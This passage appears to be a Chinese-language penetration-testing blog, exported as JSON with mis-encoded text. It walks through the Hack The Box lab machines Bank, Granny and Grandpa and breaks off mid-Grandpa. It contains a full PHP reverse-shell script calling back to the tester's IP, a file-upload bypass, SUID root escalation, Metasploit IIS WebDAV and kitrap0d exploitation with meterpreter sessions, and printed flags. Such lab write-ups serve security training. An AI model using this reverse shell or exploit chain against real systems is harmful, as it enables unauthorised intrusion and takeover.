10.10.10.29 bank.htb\n```\nç„¶åå»è®¿é—®ä¸€ä¸‹\n\n![](Hackthebox-Bank/d5168fe2-57cd-46b8-964d-59b9e9bd6025.png)\n\nè¿™å°±æœ‰é¡µé¢äº†ï¼Œå» fuzz ä¸€ä¸‹ç›®å½•\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://bank.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://bank.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nuploads                 [Status: 301, Size: 305, Words: 20, Lines: 10]\nassets                  [Status: 301, Size: 304, Words: 20, Lines: 10]\ninc                     [Status: 301, Size: 301, Words: 20, Lines: 10]\nbalance-transfer        [Status: 301, Size: 314, Words: 20, Lines: 10]\n```\nå‰ä¸‰ä¸ªéƒ½æ²¡ä¸œè¥¿ï¼Œå’±ä»¬å»çœ‹çœ‹ç¬¬å››ä¸ª `balance-transfer` \n\n![](Hackthebox-Bank/54d4c451-8a4c-4530-a9ec-7a91e915ad68.png)\n\næœ‰å¾ˆå¤šçš„ `.acc` ç»“å°¾çš„æ–‡ä»¶ï¼Œå»çœ‹ä¸€ä¸ª\n\n![](Hackthebox-Bank/0d240ea6-72f5-4959-9de0-9cbeafa010c1.png)\n\nè¿™çœ‹èµ·æ¥åƒæ˜¯å­˜å‚¨çš„ç”¨æˆ·æ•°æ®ï¼Œä½†æ˜¯éƒ½æ˜¯åŠ å¯†çš„ï¼Œæˆ‘å°è¯•äº†ä¸€ä¸‹ä¹Ÿæ— æ³•è§£å¯†å‡ºæ¥ï¼Œå¤šæ‰¾æ‰¾çœ‹\n\n```bash\nimport requests\nimport re\n\nresponse = requests.get(\"http://bank.htb/balance-transfer/\")\nhtml = response.text\nurls = re.findall('<a href=\"(.*?acc)\">.*?acc</a>', html)\nx = 1\ny = len(urls) - 1\nfor url in urls:\n    url = 'http://bank.htb/balance-transfer/' + url\n    name = url.split('/')[-1]\n    response = requests.get(url)\n    with open(name, \"wb\") as f:\n        f.write(response.content)\n        print('ã€%sã€‘ ä¸‹è½½å®Œæ¯• å½“å‰å®Œæˆä»»åŠ¡ï¼š%s æ¬¡ è¿˜å‰©ä»»åŠ¡ %s æ¬¡' % (url, x, y))\n        x += 1\n        y -= 1\n```\nç”±äºæ•°é‡æœ‰ç‚¹å¤šï¼Œæ‰€ä»¥æˆ‘å†™äº†ä¸ªç®€å•çš„çˆ¬è™«æ¥è‡ªåŠ¨ä¸‹è½½æ–‡ä»¶\n\n![](Hackthebox-Bank/723ee3d4-cdcc-4889-bf36-f696154382ef.png)\n\nä¸€å…± 999 ä¸ªç”¨æˆ·ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹æœ‰æ²¡æœ‰æ²¡æœ‰åŠ å¯†çš„æ¼ç½‘ä¹‹é±¼\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Bank/Spider]\nâ””â”€# grep -r 'bank.htb' ./                                                        \n./68576f20e9732f1b2edc4df5b8533230.acc:Email: chris@bank.htb\n```\nçˆ¬è™«çˆ¬å®Œäº†ï¼Œæœç´¢ä¸€ä¸‹æœ‰æ²¡æœ‰ `bank.htb` é‚®ç®±çš„å†…å®¹ï¼Œè¿˜çœŸæœåˆ°äº†ä¸€ä¸ª\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Bank/Spider]\nâ””â”€# cat 68576f20e9732f1b2edc4df5b8533230.acc                                                                     \n--ERR ENCRYPT FAILED\n+=================+\n| HTB Bank Report |\n+=================+\n\n===UserAccount===\nFull Name: Christos Christopoulos\nEmail: chris@bank.htb\nPassword: !##HTBB4nkP4ssw0rd!##\nCreditCards: 5\nTransactions: 39\nBalance: 8842803 .\n===UserAccount===\n```\næŸ¥çœ‹ä¸€ä¸‹å†…å®¹ï¼ŒæˆåŠŸæ‹¿åˆ°ä¸€ä¸ªå¯ä»¥ç”¨çš„è´¦å·å¯†ç \n\nå»ç™»å½•ä¸€ä¸‹åå°çœ‹çœ‹\n\n![](Hackthebox-Bank/fba5f3c6-2d3e-42d2-bf8d-6a94eef73272.png)\n\næˆåŠŸè¿›å…¥åå°\n\n![](Hackthebox-Bank/e3815ce2-45b6-4329-9b35-7a8f9909fbff.png)\n\nä¸»é¡µä¸Šæ²¡ä»€ä¹ˆåŠŸèƒ½ç‚¹ï¼Œå°±ä¸€ä¸ªæ”¯æŒï¼Œç„¶ååœ¨æ”¯æŒé‡Œé¢æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæˆ‘å°è¯•äº†ä¸€ä¸‹ç›´æ¥ä¸Šä¼  phpwebshellï¼Œä¸Šä¼ å¤±è´¥ã€‚æˆ‘ä»¬å»çœ‹çœ‹ç½‘é¡µæºç \n\n![](Hackthebox-Bank/77b0e171-5604-412b-a1b4-0a3e4ad28993.png)\n\nåœ¨ 95 è¡Œå‘ç°è¿™ä¹ˆä¸€å¥\n\nå°†ä¼šæŠŠ `.htb` æ ¼å¼çš„æ–‡ä»¶ä»¥ `.php` æ ¼å¼æ¥è¿è¡Œï¼ŒOKï¼Œæ€è·¯æœ‰äº†\n\n# æ¼æ´åˆ©ç”¨\n```bash\n<?php\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '10.10.16.4';  // CHANGE THIS\n$port = 4444;       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; /bin/bash -i';\n$daemon = 0;\n$debug = 0;\n\n//\n// Daemonise ourself if possible to avoid zombies later\n//\n\n// pcntl_fork is hardly ever available, but will allow us to daemonise\n// our php process and avoid zombies.  Worth a try...\nif (function_exists('pcntl_fork')) {\n    // Fork and have the parent process exit\n    $pid = pcntl_fork();\n\n    if ($pid == -1) {\n        printit(\"ERROR: Can't fork\");\n        exit(1);\n    }\n\n    if ($pid) {\n        exit(0);  // Parent exits\n    }\n\n    // Make the current process a session leader\n    // Will only succeed if we forked\n    if (posix_setsid() == -1) {\n        printit(\"Error: Can't setsid()\");\n        exit(1);\n    }\n\n    $daemon = 1;\n} else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\n// Change to a safe directory\nchdir(\"/\");\n\n// Remove any umask we inherited\numask(0);\n\n//\n// Do the reverse shell...\n//\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n}\n\n// Spawn shell process\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n    printit(\"ERROR: Can't spawn shell\");\n    exit(1);\n}\n\n// Set everything to non-blocking\n// Reason: Occsionally reads will block, even though stream_select tells us they won't\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n    // Check for end of TCP connection\n    if (feof($sock)) {\n        printit(\"ERROR: Shell connection terminated\");\n        break;\n    }\n\n    // Check for end of STDOUT\n    if (feof($pipes[1])) {\n        printit(\"ERROR: Shell process terminated\");\n        break;\n    }\n\n    // Wait until a command is end down $sock, or some\n    // command output is available on STDOUT or STDERR\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n    // If we can read from the TCP socket, send\n    // data to process's STDIN\n    if (in_array($sock, $read_a)) {\n        if ($debug) printit(\"SOCK READ\");\n        $input = fread($sock, $chunk_size);\n        if ($debug) printit(\"SOCK: $input\");\n        fwrite($pipes[0], $input);\n    }\n\n    // If we can read from the process's STDOUT\n    // send data down tcp connection\n    if (in_array($pipes[1], $read_a)) {\n        if ($debug) printit(\"STDOUT READ\");\n        $input = fread($pipes[1], $chunk_size);\n        if ($debug) printit(\"STDOUT: $input\");\n        fwrite($sock, $input);\n    }\n\n    // If we can read from the process's STDERR\n    // send data down tcp connection\n    if (in_array($pipes[2], $read_a)) {\n        if ($debug) printit(\"STDERR READ\");\n        $input = fread($pipes[2], $chunk_size);\n        if ($debug) printit(\"STDERR: $input\");\n        fwrite($sock, $input);\n    }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\n// Like print, but does nothing if we've daemonised ourself\n// (I can't figure out how to redirect STDOUT like a proper daemon)\nfunction printit ($string) {\n    if (!$daemon) {\n        print \"$string\\n\";\n    }\n}\n\n?>\n```\n![](Hackthebox-Bank/e69bfc8f-e153-41e2-a404-bd7eb8540533.png)\n\nå°†æˆ‘ä»¬çš„ phpshell çš„åç¼€æ›´æ”¹ä¸º `.htb` ç„¶åå»ä¸Šä¼ \n\nç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n![](Hackthebox-Bank/2cb9488a-66c1-4682-b662-37ec17f3f5dc.png)\n\nä¼ ä¸Šå»ä»¥åï¼Œç‚¹ä¸€ä¸‹é™„ä»¶\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Bank/Spider]\nâ””â”€# nc -nvlp 4444                                      \nlistening on [any] 4444 ...\nconnect to [10.10.16.4] from (UNKNOWN) [10.10.10.29] 37458\nLinux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux\n 05:08:13 up 20:18,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbash: cannot set terminal process group (1072): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@bank:/$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell\n\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\nCtrl+Z è¿”å›\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\n```\nä¿®å¤ä¸€ä¸‹ shell\n\n# æƒé™æå‡\n```bash\nfind / -user root -perm -4000 -print 2>/dev/null\n```\næœç´¢ä¸€ä¸‹æˆ‘ä»¬å¯ä»¥ç”¨æ¥æå‡æƒé™çš„ SUID æ–‡ä»¶\n\n```bash\nwww-data@bank:/$ find / -user root -perm -4000 -print 2>/dev/null\n/var/htb/bin/emergency\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/pkexec\n/usr/bin/newgrp\n/usr/bin/traceroute6.iputils\n/usr/bin/gpasswd\n/usr/bin/sudo\n/usr/bin/mtr\n/usr/sbin/pppd\n/bin/ping\n/bin/ping6\n/bin/su\n/bin/fusermount\n/bin/mount\n/bin/umount\n```\nç¬¬ä¸€ä¸ªæ–‡ä»¶ä¸€çœ‹å°±ä¸ç®€å•ï¼Œå»è¿è¡Œä¸€ä¸‹\n\n```bash\nwww-data@bank:/$ /var/htb/bin/emergency\n# ls\nbin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old\n# whoami\nroot\n```\nç›´æ¥å°± root äº†ï¼Ÿæˆ‘ä¸æ˜¯å¾ˆç†è§£åŸç†\n\n```bash\n# cat /home/chris/user.txt\n20575ef51ddd60d74b616251bc305319\n```\næ‹¿åˆ°äº† user æƒé™çš„ flag æ–‡ä»¶\n\n```bash\n# cat /root/root.txt\n9e6410fc2696f73f668c5dde1f5d0d99\n```\næ‹¿åˆ°äº† root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Granny - Hackthebox","url":"/2022/03/29/Hackthebox/Easy/Hackthebox-Granny/","content":"\n# Hackthebox - Granny\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Granny/c6d4e9ec-523a-4829-9ddb-48eade9b0e43.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Granny/734ce29b-858e-4cdd-bc54-30192bbf6ce6.png)\n\n# ä¿¡æ¯æœé›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Granny]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.15\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 00:33 EDT\nNmap scan report for 10.10.10.15\nHost is up (0.47s latency).\nNot shown: 65534 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 6.0\n| http-methods: \n|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT\n|_http-server-header: Microsoft-IIS/6.0\n|_http-title: Under Construction\n| http-webdav-scan: \n|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH\n|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK\n|   Server Type: Microsoft-IIS/6.0\n|   WebDAV type: Unknown\n|_  Server Date: Mon, 28 Mar 2022 04:34:35 GMT\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)\nOS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4\nAggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   598.17 ms 10.10.16.1\n2   598.29 ms 10.10.10.15\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 63.49 seconds\n```\n## Http\n![](Hackthebox-Granny/fa708722-0944-4ac1-a1e6-e3a119aece0b.png)\n\nè¿™å°å¾ˆçœ¼ç†Ÿå•Šï¼Œå’Œ Grandpa ä¼¼ä¹æ¶æ„ä¸€æ ·ï¼Œå»å°è¯•ä¸€ä¸‹ç›´æ¥æ‰“è¯•è¯•\n\n## Metasploit\n```bash\nmsf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options \n\nModule options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   MAXPATHLENGTH  60               yes       End of physical path brute force\n   MINPATHLENGTH  3                yes       Start of physical path brute force\n   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS         10.10.10.15      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          80               yes       The target port (TCP)\n   SSL            false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI      /                yes       Path of IIS 6 web application\n   VHOST                           no        HTTP server virtual host\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Microsoft Windows Server 2003 R2 SP2 x86\n```\nè®¾ç½®å¥½ç›¸å…³çš„é…ç½®ï¼Œå¯åŠ¨\n\n```bash\nmsf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:4444 \n[*] Trying path length 3 to 60 ...\n[*] Sending stage (175174 bytes) to 10.10.10.15\n[*] Meterpreter session 1 opened (10.10.16.4:4444 -> 10.10.10.15:1030) at 2022-03-28 00:39:57 -0400\n\nmeterpreter > getuid\n[-] stdapi_sys_config_getuid: Operation failed: Access is denied.\n```\nä¼¼ä¹è¿çªç ´ç‚¹éƒ½ä¸€æ ·ï¼Œæœ‰ç‚¹ç¦»è°±\n\n```bash\nmeterpreter > ps\n\nProcess List\n============\n\n PID   PPID  Name               Arch  Session  User                          Path\n ---   ----  ----               ----  -------  ----                          ----\n 0     0     [System Process]\n 4     0     System\n 272   4     smss.exe\n 320   272   csrss.exe\n 344   272   winlogon.exe\n 392   344   services.exe\n 404   344   lsass.exe\n 560   1064  cidaemon.exe\n 584   392   svchost.exe\n 672   392   svchost.exe\n 732   392   svchost.exe\n 772   392   svchost.exe\n 788   392   svchost.exe\n 888   1064  cidaemon.exe\n 924   392   spoolsv.exe\n 952   392   msdtc.exe\n 960   1064  cidaemon.exe\n 1064  392   cisvc.exe\n 1112  392   svchost.exe\n 1168  392   inetinfo.exe\n 1204  392   svchost.exe\n 1312  392   VGAuthService.exe\n 1380  392   vmtoolsd.exe\n 1488  392   svchost.exe\n 1588  392   svchost.exe\n 1760  392   dllhost.exe\n 1856  392   alg.exe\n 1876  584   wmiprvse.exe       x86   0        NT AUTHORITY\\NETWORK SERVICE  C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n 2252  1488  w3wp.exe           x86   0        NT AUTHORITY\\NETWORK SERVICE  c:\\windows\\system32\\inetsrv\\w3wp.exe\n 2392  584   davcdata.exe       x86   0        NT AUTHORITY\\NETWORK SERVICE  C:\\WINDOWS\\system32\\inetsrv\\davcdata.exe\n 2552  584   wmiprvse.exe\n 3792  2252  rundll32.exe       x86   0                                      C:\\WINDOWS\\system32\\rundll32.exe\n\nmeterpreter > migrate 1876\n[*] Migrating from 3792 to 1876...\n[*] Migration completed successfully.\nmeterpreter > getuid\nServer username: NT AUTHORITY\\NETWORK SERVICE\n```\nè·Ÿ Grandpa ä¸€æ ·çš„æ¼æ´æƒ…å†µï¼Œåšä¸€ä¸ªè¿›ç¨‹è¿ç§»å°±å¯ä»¥äº†\n\nç°åœ¨å»ææƒå§\n\n# æƒé™æå‡\n```bash\nmsf6 exploit(windows/local/ms10_015_kitrap0d) > show options \n\nModule options (exploit/windows/local/ms10_015_kitrap0d):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION  1                yes       The session to run this module on.\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT     5555             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 2K SP4 - Windows 7 (x86)\n```\nè®¾ç½®å¥½ sessionï¼Œå»æ‰§è¡Œ\n\n```bash\nmsf6 exploit(windows/local/ms10_015_kitrap0d) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:5555 \n[*] Launching notepad to host the exploit...\n[+] Process 2088 launched.\n[*] Reflectively injecting the exploit DLL into 2088...\n[*] Injecting exploit into 2088 ...\n[*] Exploit injected. Injecting payload into 2088...\n[*] Payload injected. Executing exploit...\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Sending stage (175174 bytes) to 10.10.10.15\n[*] Meterpreter session 2 opened (10.10.16.4:5555 -> 10.10.10.15:1031) at 2022-03-28 00:45:56 -0400\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\nmeterpreter > search -f user.txt\nFound 1 result...\n    c:\\Documents and Settings\\Lakis\\Desktop\\user.txt (32 bytes)\nmeterpreter > search -f root.txt\nFound 1 result...\n    c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes)\nmeterpreter > cat 'c:\\Documents and Settings\\Lakis\\Desktop\\user.txt'\n        700c5dc163014e22b3e408f8703f67d1\nmeterpreter > cat 'c:\\Documents and Settings\\Administrator\\Desktop\\root.txt'\n        aa4beed1c0584445ab463a6747bd06e9\nmeterpreter >\n```\næˆåŠŸæ‹¿åˆ° user å’Œ root æƒé™çš„ flag æ–‡ä»¶\n\nè¿™å°çš„æƒ…å†µå’Œ Grandpa ä¸€æ¨¡ä¸€æ ·ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„","tags":["Hackthebox"]},{"title":"Grandpa - Hackthebox","url":"/2022/03/28/Hackthebox/Easy/Hackthebox-Grandpa/","content":"\n# Hackthebox - Grandpa\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Grandpa/ba430d66-a24b-4a0d-8223-ac94cd49594a.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Grandpa/052f67c1-374a-4fc7-b687-06611a9e0814.png)\n\n# ä¿¡æ¯æœé›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Grandpa]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.14\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-25 02:52 EDT\nNmap scan report for 10.10.10.14\nHost is up (0.53s latency).\nNot shown: 65534 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 6.0\n| http-methods: \n|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH\n|_http-server-header: Microsoft-IIS/6.0\n|_http-title: Under Construction\n| http-webdav-scan: \n|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH\n|   Server Type: Microsoft-IIS/6.0\n|   Server Date: Fri, 25 Mar 2022 06:53:29 GMT\n|   WebDAV type: Unknown\n|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)\nOS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4\nAggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   524.27 ms 10.10.16.1\n2   524.42 ms 10.10.10.14\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 71.52 seconds\n```\n## Http\n![](Hackthebox-Grandpa/c400ace0-ff4f-481f-a909-af3f8fde64aa.png)\n\nè¿™é‡Œæç¤ºæ²¡æœ‰é»˜è®¤é¡µé¢ï¼Œå»çœ‹çœ‹æ˜¯ä¸æ˜¯ IIS æœ¬èº«çš„æ¼æ´å§\n\n## Searchsploit\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# searchsploit IIS 6.0      \n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nMicrosoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                                                                  | windows/remote/21057.txt\nMicrosoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                                                                           | windows/remote/9541.pl\nMicrosoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                                                                             | windows/dos/9587.txt\nMicrosoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                                                                      | windows/dos/3965.pl\nMicrosoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                                                                            | windows/dos/15167.txt\nMicrosoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                                          | windows/remote/41738.py\nMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                                                                           | windows/remote/8765.php\nMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                                       | windows/remote/8704.txt\nMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                                       | windows/remote/8806.pl\nMicrosoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                                   | windows/remote/8754.patch\nMicrosoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                          | windows/remote/19033.txt\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\næˆ‘ä»¬çœ‹çœ‹ Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow è¿œç¨‹ç¼“å†²åŒºæº¢å‡ºï¼Œæ„Ÿè§‰æœ‰æˆ\n\n# æ¼æ´åˆ©ç”¨\nå…ˆå»çœ‹çœ‹ msf æœ‰æ²¡æœ‰ç›¸å…³çš„æ¼æ´åˆ©ç”¨æ¨¡å—\n\n```bash\nmsf6 > search IIS 6.0\n\nMatching Modules\n================\n\n   #  Name                                                 Disclosure Date  Rank    Check  Description\n   -  ----                                                 ---------------  ----    -----  -----------\n   0  exploit/windows/firewall/blackice_pam_icq            2004-03-18       great   No     ISS PAM.dll ICQ Parser Buffer Overflow\n   1  auxiliary/dos/windows/http/ms10_065_ii6_asp_dos      2010-09-14       normal  No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service\n   2  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow\n\nInteract with a module by name or index. For example info 2, use 2 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl\n```\nè¿™è¾¹ç¡®å®æœ‰ä¸€ä¸ªï¼Œå»åŠ è½½ä¸€ä¸‹è¯•è¯•\n\n```bash\nmsf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options \n\nModule options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   MAXPATHLENGTH  60               yes       End of physical path brute force\n   MINPATHLENGTH  3                yes       Start of physical path brute force\n   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS         10.10.10.14      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          80               yes       The target port (TCP)\n   SSL            false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI      /                yes       Path of IIS 6 web application\n   VHOST                           no        HTTP server virtual host\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT     4444             yes  